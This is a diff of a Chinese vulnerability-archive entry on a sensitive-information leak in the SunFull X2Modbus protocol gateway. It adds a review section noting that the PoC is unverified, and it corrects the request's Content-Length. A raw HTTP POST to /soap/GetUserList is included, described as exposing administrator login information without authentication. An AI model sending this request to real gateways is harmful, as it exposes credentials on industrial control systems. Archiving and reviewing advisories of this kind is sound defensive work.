@@ -1,9 +1,54 @@
 ---
-fofa: "server="
 source: "wy876 漏洞文库"
+id: "vw-2558aa0790f65fce62170dfd"
+entity_id: "ve-2558aa0790f65fce62170dfd"
+schema_version: "1"
+fofa_unverified: "server="
+title: "上海迅饶自动化科技有限公司X2Modbus网关GetUserList存在敏感信息泄露"
+product: "SunFull迅饶X2Modbus"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "无认证头，版本未知"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96/%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3GetUserList%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md"
+review_date: "2026-10-02"
+side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
+source_url: "https://www.yuque.com/xiaokp7/ocvun2/twhz9rc6wex3xe15"
+source_status: "recorded"
 ---
 
 # 上海迅饶自动化科技有限公司X2Modbus网关GetUserList存在敏感信息泄露
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：SunFull迅饶X2Modbus
+- 本文讨论：soap/GetUserList用户信息
+- 版本、权限与配置前提：无认证头，版本未知
+- 资料类型：信息泄露请求摘录；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 无返回字段，管理员登录信息泄露未展示
+- Content-Length56与CmpWc空值正文不符；FOFA元数据server=残缺
+- 已落实的文本修订：“Content-Length: 56”改为“Content-Length: 6”；HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+
+### 操作风险与恢复
+
+- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本
+
+### 待核与来源
+
+- 匿名访问、具体敏感字段与修复待核
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 # 一、漏洞简介
 X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大的协议转换网关， 这里的X代表各家不同的通信协议， 2是To的谐音表示转换， Modbus就是最终支持的标准协议是Modbus协议。用户可以根据现场设备的通信协议进行配置，转成标准的Modbus协议。在PC端仿真运行无误后，上传到硬件协议转换网关。X2Modbus网关GetUserList接口存在一个信息泄漏漏洞，使得未经授权的用户或攻击者可以获取管理员登录信息。
@@ -17,7 +62,7 @@ X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大
 
 
 # 四、漏洞复现
-```java
+```http
 POST /soap/GetUserList HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
@@ -27,7 +72,7 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 56
+Content-Length: 6
 
 CmpWc=
 ```
